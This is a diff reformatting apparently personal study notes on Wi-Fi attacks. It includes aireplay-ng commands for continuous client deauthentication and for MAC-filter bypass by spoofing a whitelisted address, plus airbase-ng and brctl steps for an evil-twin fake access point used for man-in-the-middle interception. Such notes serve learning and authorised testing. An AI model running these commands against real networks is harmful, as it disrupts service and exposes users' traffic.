@@ -13,9 +13,10 @@
 **Finding Hidden SSIDs**
 6. 
 	a. Passive way - monitor the network for clients to connect
-	b. active way - break all the connections between clients and Access point and further monitor the traffic for assocication traffic.
-		(send the deauthentication notification packet to the clients)
-
+	b. active way - break all the connections between clients and Access point and further monitor the traffic for assocication 
+	traffic.
+		
+	(send the deauthentication notification packet to the clients)
 	aireplay-ng --deauth 0 -a <BSSID> wlan0mon -D   
 
 	--deauth 0 will continously send deauth packets
@@ -23,8 +24,10 @@
 
 7. Bypassing MAC filters
 
-	a. aireplay-ng --fakeauth 10 -e Logan wlan0mon  --> Trying a fake authentication using the wireless card when MAC filter is off(open network)
-	b. aireplay-ng --fakeauth 10 -e Logan wlan0mon -h <whiteListedMacAddress> --> To spoof a mac address and fool the AP to allow authentication
+	a. aireplay-ng --fakeauth 10 -e Logan wlan0mon  --> Trying a fake authentication using the wireless card when MAC filter is 	
+	off(open network)
+	b. aireplay-ng --fakeauth 10 -e Logan wlan0mon -h <whiteListedMacAddress> --> To spoof a mac address and fool the AP to allow
+	authentication
 
 8. Cracking Shared/WEP encyption
 	
@@ -39,15 +42,16 @@
 	a. airbase-ng -a AA:AA:AA:AA:AA:AA -e Logan wlan0mon -v    ---> Broadcast fake AP SSID
 	b. ifconfig at0 up  ---> Power up the soft interface created
 	c. 
-		1. brctl addbr mitm  ---> creating bridge mitm with brctl
-		2. brctl addif mitm eth0  ---> adding interfaces to the bridge
+	
+		 1. brctl addbr mitm  ---> creating bridge mitm with brctl
+		 2. brctl addif mitm eth0  ---> adding interfaces to the bridge
 		   brctl addif mitm at0
 
-		3. ifconfig eth0 0.0.0.0 up
+		 3. ifconfig eth0 0.0.0.0 up
 		   ifconfig at0 0.0.0.0 up
 
-		4. ifconfig mitm up   ---> powering up the bridge interface
-		5. dhclient mitm & ---> running dhcp client on bridge interface 	
+		 4. ifconfig mitm up   ---> powering up the bridge interface
+		 5. dhclient mitm & ---> running dhcp client on bridge interface 	
 			---> bridge the 2 interfaces (at0 with the other interface that has internet On)
 
 **links --> https://forums.kali.org/showthread.php?17926-Fake-access-point-ettercap-sslstrip
